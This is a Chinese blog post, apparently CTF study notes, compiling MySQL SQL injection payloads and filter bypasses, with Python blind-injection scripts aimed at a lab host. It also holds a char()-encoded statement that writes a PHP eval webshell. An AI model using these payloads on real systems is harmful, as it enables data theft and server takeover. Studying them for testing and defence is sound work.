---
title: SQL注入
date: 2023-10-20 18:38:57
tags: ["Sql injection"]
categories: ["Summary"]
about: 有个sql注入，好多东西的sql，看了一些大佬的总结，搬了一些----QAQ----
---

# SQL注入

[SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10594#toc-6)[盲注去这]

## 联合查询

很多时候联合查询也会和其他的几种查询方式一起使用。

##### 联合查询用到的SQL语法知识

`UNION`可以将前后两个查询语句的结果拼接到一起，但是会自动去重。

`UNION ALL`功能相同，但是会显示所有数据，不会去重。

具有类似功能的还有`JOIN` https://blog.csdn.net/julielele/article/details/82023577 但是是一个对库表等进行连接的语句，我们在后续的绕过中会提到利用它来进行无列名注入。

##### 注入流程

1. 判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式

   ```
   ?id=1' 
   ?id=1" 
   ?id=1') 
   ?id=1") 
   ?id=1' or 1#
   ?id=1' or 0#
   ?id=1' or 1=1#
   ?id=1' and 1=2#
   ?id=1' and sleep(5)#
   ?id=1' and 1=2 or ' 
   ?id=1\
   ```

2. 猜测SQL查询语句中的字段数

   - 使用 order/group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。

   ```
   1' order by 1#
   1' order by 2#
   1' order by 3#
   1 order by 1
   1 order by 2
   1 order by 3
   ```

   - 使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。

   ```
   1' union select 1#
   1' union select 1,2#
   1' union select 1,2,3#
   1 union select 1#
   1 union select 1,2#
   1 union select 1,2,3#
   ```

3. 确定显示数据的字段位置
   使用 union select 1,2,3,4,... 根据回显的字段数，判断回显数据的字段位置。

   ```
   -1' union select 1#
   -1' union select 1,2#
   -1' union select 1,2,3#
   -1 union select 1#
   -1 union select 1,2#
   -1 union select 1,2,3#
   ```

   注意：

   - 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。
   - ⼀定要拼接够足够的字段数，否则SQL语句报错。

4. 在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于：

   - 获取当前数据库名

   ```
   -1' union select 1,2,database()--+
   ```

   - 获取当前数据库的表名

   ```
   -1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
   
   -1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+
   ```

   - 获取表中的字段名

   ```
   -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
   
   -1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+
   ```

   - 获取数据

   ```
   -1' union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+
   
   -1' union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+
   ```

一般情况下就是这样的一个顺序，`确定联合查询的字段数->确定联合查询回显位置->爆库->爆表->爆字段->爆数据`。





## 	报错注入：

#### 报错注入用到的SQL语法知识

大体的思路就是利用报错回显，同时我们的查询指令或者SQL函数会被执行，**报错的过程可能会出现在查询或者插入甚至删除的过程**中。

#### 0x00 floor()（8.x>mysql>5.0）[双查询报错注入]

函数返回小于或等于指定值（value）的最小整数,取整

> 通过floor报错的方法来爆数据的**本质是group by语句的报错**。group by语句报错的原因是`floor(random(0)*2)`的不确定性，即可能为0也可能为1
>
> group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，**如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。**
>
> group by `floor(random(0)*2)`出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下`floor(random(0)*2)`可能为0，如果此时临时表**只有key为1的行不存在key为0的行**，那么数据库要将该条记录**插入**临时表，由于是随机数，插时又要计算一下随机值，此时`floor(random(0)*2)`结果可能为1，就会导致插入时**冲突而报错**。即检测时和插入时两次计算了随机数的值。

```
?id=0’ union select 1,2,3 from(select count(*),concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+
/*拆解出来就是下面的语句*/
concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x
```

**可以看到这里实际上不光使用了报错注入还是用了刚刚的联合查询，同时还是一个双查询的报错注入，当在一个聚合函数，比如count()函数后面如果使用group by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错**



大体思路就是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，但是因为随机数要测试多次才能得到报错，上面报错注入函数中的第一个`Floor()`就是这种情况。

#### 0x01 extractvalue()        [Writeup_2023_0xGame_Week2 - rdj's Blog (notnad3.github.io)](https://notnad3.github.io/2023/10/01/[Week 2] ez_upload/)【例题，sql注入】

对XML文档进行查询的函数

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

```
and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))
```

其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样

语法：extractvalue(目标xml文档，xml路径)

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错

select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))

![img](https://img-blog.csdn.net/20180609105306938)

使用concat()拼接 ‘  /  ‘ 效果相同，

select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘/’,(select database()))))

![img](https://img-blog.csdn.net/20180609105334286)

这里在’anything’中查询不到 位置是 /database()的内容，

但也没有语法错误，不会报错，下面故意写入语法错误：

select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))

![img](https://img-blog.csdn.net/20180609105509672)

可以看出，以~开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。

有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位

这里查询前5位示意:

select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))

![img](https://img-blog.csdn.net/20180609105559745)



#### 0x02 UPDATEXML (XML_document, XPath_string, new_value);

- 第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc
- 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
- 第三个参数：new_value，String格式，替换查找到的符合条件的数据

作用：改变文档中符合条件的节点的值

由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。

这也是一种非常常见的报错注入的函数。

```
' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
```

#### 0x03 exp(x)

返回 e 的 x 次方,当 数据过大 溢出时报错，即 x > 709

```
mail=') or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))) as asd))--+
```

#### 0x04 geometrycollection() mysql 版本5.5

（1）函数解释：
GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。

（2）官方文档中举例的用法如下：
GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))

（3）报错原因：
因为MYSQL无法使用这样的字符串画出图形，所以报错

```
1') and geometrycollection((select * from(select * from(select version())a)b)); %23
1') and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name='manage' limit 0,1)a)b)); %23
1') and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23
```

这里和我们上面学过的cancat和上一关学的内置表有两个梦幻联动

#### 0x05 multipoint() mysql 版本5.5

（1）函数解释：
MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。
 
（2）报错原因：
同样是因为无法使用字符串画出图形与geometrycollection类似

```
1') and multipoint((select * from(select * from(select version())a)b)); %23
```

#### 0x06 polygon()

polygon来自希腊。 “Poly” 意味 “many” ， “gon” 意味 “angle”.
Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。

```
') or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,':',password) from manage))asd)asd))--+
```

#### 0x07 mutipolygon()

```
') or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,':',password) from manage))asd)asd))
```

#### 0x08 linestring(）

报错原理：
mysql的有些几何函数（ 例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)

```
1') and linestring((select * from(select * from(select database())a)b))--+;
```

#### 0x09 multilinestring()

同上

#### 0x0a ST.LatFromGeoHash()（mysql>=5.7.x）

```
') or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))))a)b))--+
```

#### 0x0b ST.LongFromGeoHash

同上 嵌套查询

#### 0x0c ST_Pointfromgeohash (mysql>5.7)

```
#获取数据库版本信息
')or  ST_PointFromGeoHash(version(),1)--+
')or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+
')or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = 'manage' limit 0,1),1)--+
')or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,':',`password`) from manage),0x23)),1)--+
```

#### 0x0d GTID (MySQL >= 5.6.X - 显错<=200)

**0x01 GTID**
GTID是MySQL数据库每次提交事务后生成的一个全局事务标识符，GTID不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的

> GTID的表现形式 -> GTID =source_id:transaction_id其中source_id一般为数据库的uuid，transaction_id为事务ID，从1开始3E11FA47-71CA-11E1-9E33-C80AA9429562:23如上面的GTID可以看出该事务为UUID为3E11FA47-71CA-11E1-9E33-C80AA9429562的数据库的23号事务

**GTID集合**(一组全局事务标识符)：
GTID集合为多个单GTID和一个范围内GTID的集合，他主要用于如下地方

- gtid_executed 系统变量
- gtid_purged系统变量
- GTID_SUBSET() 和 GTID_SUBTRACT()函数

格式如下：

```
3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5
```

**0X02 函数详解**

GTID_SUBSET() 和 GTID_SUBTRACT() 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错

1. GTID_SUBSET( set1 , set2 ) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)
2. GTID_SUBTRACT( set1 , set2 ) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)
   正常情况如下

> GTID_SUBSET(‘3E11FA47-71CA-11E1-9E33-C80AA9429562:23’,‘3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57’)GTID_SUBTRACT(‘3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57’,‘3E11FA47-71CA-11E1-9E33-C80AA9429562:20-25’)

**0x03 注入过程( payload )**

**GTID_SUBSET函数**

```
') or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+
```

**GTID_SUBTRACT**

```
') or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+
```

上面是一些常见或者不常见的能够报错注入的函数，报错注入就是利用这些函数，在我们的查询语句中的这些函数内的某个位置再嵌套一个子查询，利用产生的报错将子查询的结果回显出来，每个报错注入的函数都搭配了网上找到的简单的payload，情况总是在变化，注意一下函数中子查询所在的位置即可。

###### 使用不存在的函数来报错

[![img](https://b3logfile.com/siyuan/1621238442570/assets/image-20211126104156-twt8ddd.png)](https://b3logfile.com/siyuan/1621238442570/assets/image-20211126104156-twt8ddd.png)

随便使用一个不存在的函数，可能会得到当前所在的数据库名称。

###### 使用 join using() 报错获取列名

- 一般应用于**无列名注入**，下文绕过中会细讲。

> 通过关键字join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因（相同列名存在），而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。

下面演示如何通过join...using来获取列名：

```
# 获取第一列的列名:
1' union select * from (select * from users as a join users as b)as c#

# 使用using()依次获取后续的列名
1' union all select * from (select * from users as a join users b using(id))c#
1' union all select * from (select * from users as a join users b using(id,username))c#
1' union all select * from (select * from users as a join users b using(id,username,password))c#
# 数据库中as主要作用是起别名, 常规来说as都可以省略，但是为了增加可读性, 不建议省略
```

##### 注入流程

大体的注入流程就是在联合查询不成功的情况下尝试使用报错注入的函数得到回显子查询结果的报错结果。





#### 双报错注入详解：

在此之前，我们理解一下子查询，查询的关键字是select，这个大家都知道。子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。

看一个简单的例子：

```cpp
Select concat((select database()));
```

真正执行的时候，先从子查询进行。因此执行select database() 这个语句就会把当前的[数据库](http://www.2cto.com/database/)查出来，然后把结果传入到[concat](https://so.csdn.net/so/search?q=concat&spm=1001.2101.3001.7020)函数。这个函数是用来连接的。比如 concat(‘a’,’b’)那结果就是ab了。

原理：

双注入查询需要理解四个函数/语句

```cpp
1. Rand() //随机函数
2. Floor() //取整函数
3. Count() //汇总函数
4. Group by clause //分组语句
```

简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。[本博主注:这个是Mysql的bug，详见[链接](https://blog.csdn.net/lixiangminghate/article/details/80466333)]

以本地一个名为Security的数据库为例

```cpp
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));
```

不要怕。先看最里面的SELECT database() 这个就返回数据库名，这里就是security了。然后FLOOR(RAND()*2)这个上面说过了。不是0，就是1.然后把这两个的结果进行concat连接，那么结果不是security0就是security1了。

![img](https://img-blog.csdn.net/20180527000303157)

如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，这里users表里有13个用户，所以返回了13条

![img](https://img-blog.csdn.net/20180527000350116)

如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。这里本机有三个数据库。所以会返回三个结果

![img](https://img-blog.csdn.net/2018052700044918)

现在我们准备加上Group By 语句了。
我们使用information_schema.tables 或 information_schema.columns者两个表来查询。因为表里面一般数据很多。容易生成很多的随机值，不至于全部是security0，这样就不能查询出结果了。

```cpp
select concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;
```

这里我先解释一下。

我们把concat((select database()), floor(rand()*2)) 这个结果取了一个别名 a ，然后使用他进行分组。这样相同的security0分到一组，security1分到一组。就剩下两个结果了。

![img](https://img-blog.csdn.net/2018052700054078)

注意这里的database()可以替换成任何你想查的函数，比如version(), user(), datadir()或者其他的查询。比如查表啊。查列啊。原理都是一样的。

最后的亮点来了。。

我们输入这条：注意多了一个聚合函数count(*)

```cpp
select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;
```

![img](https://img-blog.csdn.net/20180527000625891)

报错了

```cpp
ERROR 1062 (23000): Duplicate entry 'security1' for key ‘group_key’
```

原因是重复的键值。

可以看到security就是我们的查询结果了

想要查询版本就这样：

```cpp
select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;
```

看看替换了database()为version()

![img](https://img-blog.csdn.net/20180527000746699)

再看一个

```cpp
select count(*), concat('~',(select user()),'~', floor(rand()*2))as a from information_schema.tables group by a;
```

报错

```cpp
ERROR 1062 (23000): Duplicate entry '~root@localhost~1' for key 'group_key'
```

这里的~这个符号只是为了让结果更清晰。





## "常见"绕过：

#### 结尾注释符绕过

Mysql中常见的注释符

```
、#    %23    --+或-- -    ;%00
```

如果所有的注释符全部被过滤了，把我们还可以尝试直接使用引号进行闭合，这种方法很好用。

#### 字符串变换绕过

```
# 大小写绕过
-1' UnIoN SeLeCt 1,2,database()--+

# 双写绕过
-1' uniunionon selselectect 1,2,database()--+

# 字符串拼接绕过
1';set @a=concat("sel","ect * from users");prepare sql from @a;execute sql;
```

#### 过滤 and、or 绕过

##### 管道符

```
and => &&
or => ||
```

##### 使用^进行异或盲注绕过

> 异或运算规则:
> `1^1=0 0^0=0 0^1=1`
> `1^1^1=0 1^1^0=0`
> 构造payload:`'^ascii(mid(database(),1,1)=98)^0`

注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.

#### 过滤空格绕过

以下字符可以代替空格：

```
# 使用注释符/**/代替空格:
select/**/database();

# 使用加号+代替空格:(只适用于GET方法中)
select+database();
# 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)

# 使⽤括号嵌套:
select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());

# 使⽤其他不可⻅字符代替空格:
%09, %0a, %0b, %0c, %0d, %a0

#利用``分隔进行绕过
select host,user from user where user='a'union(select`table_name`,`table_type`from`information_schema`.`tables`);
```

同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。

#### 过滤括号绕过

##### 利用 order by 进行布尔盲注

上面有

#### 过滤比较符号（=、<、>）绕过

比较符号一般也只出现在盲注中，所以都尽可能搭配了脚本。

##### 使用 in() 绕过

```
/?id=' or ascii(substr((select database()),1,1)) in(114)--+    // 错误
/?id=' or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显

/?id=' or substr((select database()),1,1) in('s')--+    // 正常回显
```

综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：

```
import requests

url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="

payload = "' or ascii(substr((select database()),{0},1)) in({1})--+"
flag = ''
if __name__ == "__main__":
    for i in range(1, 100):
        for j in range(37,128):
            url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=' or ascii(substr((select database()),{0},1)) in({1})--+".format(i,j)
            r = requests.get(url=url)
            if "You are in" in r.text:
                flag += chr(j)
                print(flag)
```

##### LIKE 注入

在LIKE子句中，百分比(%)通配符允许**匹配任何字符串的零个或多个字符**。下划线 `_` 通配符允许**匹配任何单个字符**。**匹配成功则返回1，反之返回0**，可用于sql盲注。

1. 判断数据库长度

可用length()函数，也可用`_`，如：

```
/?id=' or database() like '________'--+  // 回显正常
```

1. 判断数据库名

```
/?id=' or database() like 's%' --+
/?id=' or (select database()) like 's%' --+
或者:
/?id=' or database() like 's_______' --+
/?id=' or (select database()) like 's_______' --+
```

如上图所示，回显正常，说明数据库名的第一个字符是s。

综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：

```
import requests
import string

# strs = string.printable
strs = string.ascii_letters + string.digits + '_'
url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="

payload = "' or (select database()) like '{}%'--+"

if __name__ == "__main__":
    name = ''
    for i in range(1, 40):
        char = ''
        for j in strs:
            payloads = payload.format(name + j)
            urls = url + payloads
            r = requests.get(urls)
            if "You are in" in r.text:
                name += j
                print(j, end='')
                char = j
                break
        if char == '#':
            break
```

##### REGEXP 注入

REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。

1. 判断数据库长度

```
/?id=' or (length(database())) regexp 8 --+  // 回显正常
```

1. 判断数据库名

```
/?id=' or database() regexp '^s'--+    // 回显正常
/?id=' or database() regexp 'se'--+    // 回显正常, 不适用^和$进行匹配也可以
/?id=' or database() regexp '^sa'--+   // 报错
/?id=' or database() regexp 'y$'--+    // 回显正常
```

脚本：

```
import requests
import string

# strs = string.printable
strs = string.ascii_letters + string.digits + '_'
url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="

payload = "' or (select database()) regexp '^{}'--+"

if __name__ == "__main__":
    name = ''
    for i in range(1, 40):
        char = ''
        for j in strs:
            payloads = payload.format(name + j)
            urls = url + payloads
            r = requests.get(urls)
            if "You are in" in r.text:
                name += j
                print(j, end='')
                char = j
                break
        if char == '#':
            break
```

以上脚本都要注意是掌握编写思路，不是干抄脚本。

#### 过滤引号绕过

##### 宽字节注入

###### 前置知识

**magic_quotes_gpc** （魔术引号开关）

`magic_quotes_gpc`函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。

单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线，我们输入的东西如果不能闭合，那我们的输入就不会当作代码执行，就无法产生SQL注入。

**addslashes()函数**

返回在预定义字符之前添加反斜杠的字符串

> 预定义字符：单引号（'），双引号（"），反斜杠（\），NULL

###### 宽字节概念：

1. 单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)
2. 多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。
3. UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。
4. 常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。
5. 宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字

###### 成因与示例

前面讲到了GBK编码格式。GBK是双字符编码，那么为什么他们会和渗透测试发送了“巧遇”呢？

**宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。**

例如说MySql的编码设置为了SET NAMES 'gbk'或是 SET character_set_client =gbk，这样配置会引发编码转换从而导致的注入漏洞。

**宽字节SQL注入的根本原因:**

**宽字节SQL注入就是PHP发送请求到MySql时使用了语句**

**SET NAMES 'gbk' 或是SET character_set_client =gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。**

**magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符'\',来做一定的过滤**

为了绕过magic_quotes_gpc的\,于是乎我们开始导入宽字节的概念

我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c

```
SELECT * FROM users WHERE id='1\'' LIMIT 0,1
```

这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，然后成功绕过

```
SELECT * FROM users WHERE id='1�\'#' LIMIT 0,1
```

###### 虽然是写在了过滤引号的位置但是其实不止适用于过滤引号

##### 使用反斜杠 \ 逃逸 Sql 语句

如果没有过滤反斜杠的话，我们可以使用反斜杠将后面的引号转义，从而逃逸后面的 Sql 语句。

假设sql语句为：

```
select username, password from users where username='$username' and password='$password';
```

假设输入的用户名是 `admin\`，密码输入的是 `or 1#` 整个SQL语句变成了

```
select username,password from users where username='admin\' and password=' or 1#'
```

由于单引号被转义，`and password=`这部分都成了username的一部分，即

```
username='admin\' and password='
```

这样 `or 1` 就逃逸出来了，由此可控，可作为注入点了。

#### 堆叠注入时利用 MySql 预处理

在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用**MySql预处理语句配合concat拼接**来执行sql语句拿flag。

1. PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(`hello`)供之后调用
2. EXECUTE：执行命令
3. DEALLOCATE PREPARE：释放命令
4. SET：用于设置变量(`@a`)

```
1';sEt @a=concat("sel","ect flag from flag_here");PRepare hello from @a;execute hello;#
```

这里还用大小写简单绕了一下其他过滤

##### MySql 预处理配合十六进制绕过关键字

基本原理如下：

```
mysql> select hex('show databases');
+------------------------------+
| hex('show databases;')       |
+------------------------------+
| 73686F7720646174616261736573 |
+------------------------------+
1 row in set (0.01 sec)

mysql> set @b=0x73686F7720646174616261736573;
Query OK, 0 rows affected (0.01 sec)

mysql> prepare test from @b;
Query OK, 0 rows affected (0.02 sec)
Statement prepared

mysql> execute test;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| challenges         |
| mysql              |
| performance_schema |
| security           |
| test               |
+--------------------+
6 rows in set (0.02 sec)
```

即payload类似如下：

```
1';sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#
```

##### MySql预处理配合字符串拼接绕过关键字

原理就是借助`char()`函数将ascii码转化为字符然后再使用`concat()`函数将字符连接起来，有了前面的基础这里应该很好理解了：

```
set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;
```

也可以不用concat函数，直接用char函数也具有连接功能：

```
set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;
```

#### 过滤逗号绕过

当逗号被过滤了之后，我们便不能向下面这样正常的时候substr()函数和limit语句了：

```
select substr((select database()),1,1);
select * from users limit 0,1;
```

##### 使用from...for...绕过

我们可以使用 `from...for..` 语句替换 substr() 函数里的 `,1,1`：

```
select substr((select database()) from 1 for 1);
# 此时 from 1 for 1 中的两个1分别代替 substr() 函数里的两个1

select substr((select database()) from 1 for 1);    # s
select substr((select database()) from 2 for 1);    # e
select substr((select database()) from 3 for 1);    # c
select substr((select database()) from 4 for 1);    # u
select substr((select database()) from 5 for 1);    # r
select substr((select database()) from 6 for 1);    # i
select substr((select database()) from 7 for 1);    # t
select substr((select database()) from 8 for 1);    # y

# 如果过滤了空格, 则可以使用括号来代替空格:
select substr((select database())from(1)for(1));    # s
select substr((select database())from(2)for(1));    # e
select substr((select database())from(3)for(1));    # c
select substr((select database())from(4)for(1));    # u
select substr((select database())from(5)for(1));    # r
select substr((select database())from(6)for(1));    # i
select substr((select database())from(7)for(1));    # t
select substr((select database())from(8)for(1));    # y
```

即，from用来指定从何处开始截取，for用来指定截取的长度，如果不加for的话则 `from 1` 就相当于从字符串的第一位一直截取到最后：

```
select substr((select database()) from 1);    # security
select substr((select database()) from 2);    # ecurity
select substr((select database()) from 3);    # curity
select substr((select database()) from 4);    # urity
select substr((select database()) from 5);    # rity
select substr((select database()) from 6);    # ity
select substr((select database()) from 7);    # ty
select substr((select database()) from 8);    # y

# 也可以使用负数来倒着截取:
select substr((select database())from(-1));    # y
select substr((select database())from(-2));    # ty
select substr((select database())from(-3));    # ity
select substr((select database())from(-4));    # rity
select substr((select database())from(-5));    # urity
select substr((select database())from(-6));    # curity
select substr((select database())from(-7));    # ecurity
select substr((select database())from(-8));    # security
```

##### 使用offset关键字绕过

我们可以使用 `offset` 语句替换 limit 语句里的逗号：

```
select * from users limit 1 offset 2;
# 此时 limit 1 offset 2 可以代替 limit 1,2
```

##### 利用join与别名绕过

```
select host,user from user where user='a'union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`='mysql')`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`='mysql')b));
```

#### 过滤information_schema绕过与无列名注入 *

当过滤or时，这个库就会被过滤，那么mysql在被waf禁掉了information_schema库后还能有哪些利用思路呢？

information_schema 简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。

能够代替information_schema的有：

- sys.schema_auto_increment_columns 只显示有自增的表

- sys.schema_table_statistics_with_buffer

- x$schema_table_statistics_with_buffer

  ```
  select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();
  ```

- mysql.innodb_table_stats

- mysql.innodb_table_index

以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。

但是在使用上面的后两个表来获取表名之后`select group_concat(table_name) from mysql.innodb_table_stats`，我们是没有办法获得列的，这个时候就要采用无列名注入的办法。

#### 无列名注入

##### 123法

我们可以利用一些查询上的技巧来进行无列名、表名的注入。

在我们直接`select 1,2,3`时，会创建一个虚拟的表

[![img](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102451-qfyyn3w.png)](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102451-qfyyn3w.png)

如图所见列名会被定义为1，2，3

当我们结合了union联合查询之后

[![img](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102627-aucxfpc.png)](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102627-aucxfpc.png)

如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password，进而我们就可以构造这样的查询语句来查询password：

```
